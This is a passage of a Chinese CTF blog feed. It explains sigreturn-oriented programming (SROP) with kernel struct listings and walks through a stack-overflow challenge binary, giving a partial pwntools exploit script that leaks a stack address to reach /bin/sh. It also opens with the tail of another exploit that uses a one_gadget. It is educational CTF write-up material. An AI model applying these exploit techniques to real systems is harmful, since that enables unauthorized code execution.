operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>base<span class=\"token operator\">+</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># ong_gadget base+0xe3b01</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "canary"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/03/srop/",
            "url": "https://yhuanhuan01.github.io/2023/08/03/srop/",
            "title": "srop",
            "date_published": "2023-08-03T14:51:25.000Z",
            "content_html": "<h1 id=\"srop\"><a class=\"markdownIt-Anchor\" href=\"#srop\">#</a> srop</h1>\n<h2 id=\"srop原理\"><a class=\"markdownIt-Anchor\" href=\"#srop原理\">#</a> srop 原理</h2>\n<h3 id=\"signal-机制\"><a class=\"markdownIt-Anchor\" href=\"#signal-机制\">#</a> signal 机制 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jc2lnbmFs\">¶</span></h3>\n<p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>\n<p><img data-src=\"/img/srop/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></p>\n<ol>\n<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>\n<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。** 需要注意的是，这一部分是在用户进程的地址空间的。** 之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>\n</ol>\n<p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext</p>\n<ul>\n<li>x86</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> __gsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> __fsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> __esh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> __dsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>x64</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __uint16_t        cwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __uint16_t        swd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  __uint16_t        ftw<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __uint16_t        fop<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __uint64_t        rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  __uint64_t        rdp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  __uint32_t        mxcsr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  __uint32_t        mxcr_mask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpxreg</span>    _st<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_xmmreg</span>    _xmm<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  __uint32_t        padding<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  __uint64_t r8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  __uint64_t r9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  __uint64_t r10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  __uint64_t r11<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  __uint64_t r12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  __uint64_t r13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  __uint64_t r14<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  __uint64_t r15<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  __uint64_t rdi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  __uint64_t rsi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  __uint64_t rbp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  __uint64_t rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  __uint64_t rdx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  __uint64_t rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  __uint64_t rcx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  __uint64_t rsp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  __uint64_t rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  __uint64_t eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> __pad0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  __uint64_t err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  __uint64_t trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  __uint64_t oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  __uint64_t cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  __extension__ <span class=\"token keyword\">union</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，**32 位的 sigreturn 的调用号为 <u>119(0x77)</u>，64 位的系统调用号为 <u>15(0xf)</u></li>\n</ol>\n<h2 id=\"攻击原理\"><a class=\"markdownIt-Anchor\" href=\"#攻击原理\">#</a> 攻击原理</h2>\n<p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>\n<ul>\n<li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li>\n<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>\n</ul>\n<h3 id=\"获取-shell\"><a class=\"markdownIt-Anchor\" href=\"#获取-shell\">#</a> 获取 shell</h3>\n<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息</p>\n<p><img data-src=\"/img/srop/srop-example-1.png\" alt=\"signal2-stack\"></p>\n<p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。___(相当于还原我们调好的寄存器的值)</p>\n<h3 id=\"system-call-chains\"><a class=\"markdownIt-Anchor\" href=\"#system-call-chains\">#</a> system call chains</h3>\n<p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>\n<ul>\n<li><strong>控制栈指针。</strong></li>\n<li><strong>把原来 rip 指向的 <code>syscall</code>  gadget 换成 <code>syscall; ret</code>  gadget。</strong></li>\n</ul>\n<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p>\n<p><img data-src=\"/img/srop/srop-example-2.png\" alt=\"signal2-stack\"></p>\n<h3 id=\"后续\"><a class=\"markdownIt-Anchor\" href=\"#后续\">#</a> 后续 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jXzM=\">¶</span></h3>\n<p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p>\n<ul>\n<li><strong>可以通过栈溢出来控制栈的内容</strong></li>\n<li>需要知道相应的 **<u>地址</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>需要有够大的空间来塞下整个 sigal frame</li>\n</ul>\n<p>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：</p>\n<h2 id=\"一道例题\"><a class=\"markdownIt-Anchor\" href=\"#一道例题\">#</a> 一道例题</h2>\n<h3 id=\"检查\"><a class=\"markdownIt-Anchor\" href=\"#检查\">#</a> 检查</h3>\n<p><img data-src=\"/img/srop/image-20230803220602093.png\" alt=\"image-20230803220602093\"></p>\n<p><img data-src=\"/img/srop/image-20230803220635434.png\" alt=\"image-20230803220635434\"></p>\n<p>发现输入很少字符，程序就崩溃。堆栈不可执行。</p>\n<h3 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h3>\n<p><img data-src=\"/img/srop/image-20230803220825554.png\" alt=\"image-20230803220825554\"></p>\n<p><img data-src=\"/img/srop/image-20230803220903459.png\" alt=\"image-20230803220903459\"></p>\n<p><img data-src=\"/img/srop/image-20230803220926236.png\" alt=\"image-20230803220926236\"></p>\n<p>mian 函数进入 vuln，很容易发现 vuln 函数调用 sys_read 和 sys_write 系统调用函数。其中在 buf 中有漏洞点。并发现 gadgets 中有</p>\n<pre><code class=\"language-commonlisp\"># 00000000004004DA                 mov     rax, 0Fh\n</code></pre>\n<p>所以很明显可以进行 srop。</p>\n<p>srop 达成攻击的条件是一下内容：</p>\n<ul>\n<li><strong>可以通过栈溢出来控制栈的内容</strong></li>\n<li>需要知道相应的 **<u>地址</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>需要有够大的空间来塞下整个 sigal frame</li>\n</ul>\n<p>检查字符串并没有 binsh，所以我们可以用 sys_read 读入，去泄露栈的基址，然后去计算 binsh 在栈中的偏移。因为虽然程序远程和本地加载不同，但是 bin/sh 读入的偏移是相同的。根据这个原理，我们去计算本地调试的 /bin/sh 的偏移</p>\n<p>但这题我们并不知的去如何泄露栈的基址，那该咋办。凡事先调试再说。</p>\n<p>main 函数之前记录 rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222622304.png\" alt=\"image-20230803222622304\"></p>\n<p>输入 /bin/sh 记录 rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222733528.png\" alt=\"image-20230803222733528\"></p>\n<p>从 rsi 中，我们能得到 bin/sh 在栈中的偏移 —— 0x7fffffffddf8 - 0x7fffffffdce0</p>\n<p><img data-src=\"/img/srop/image-20230803223305868.png\" alt=\"image-20230803223305868\"></p>\n<p>从这里我们就能发现 ——write 打印出 0x30 个字节，可以看出从低地址开始打印 0x20 个字节后 0x8 就是栈基址</p>\n<p>所以通过 write 函数能打印出 libc 栈基址</p>\n<p>打印完栈基址我们就能通过偏移计算出 binsh 的基址了。</p>\n<p>思路有了，直接上 exp</p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r = remote('node2.anna.nssctf.cn',28450)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./PWN3')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/f145h/Desktop/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'F145H'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x4004ED</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输/bin/sh之前======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输/bin/sh之后======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>of <span class=\"token operator\">=</span> <span class=\"token number\">0x7fffffffde28</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fffffffdd10</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token string\">'of 计算binsh在栈的偏移'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>l_stack <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>binsh <span class=\"token operator\">=</span> l_stack <span class=\"token operator\">-</span> of</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>l_stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'binsh_addr=======>'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td 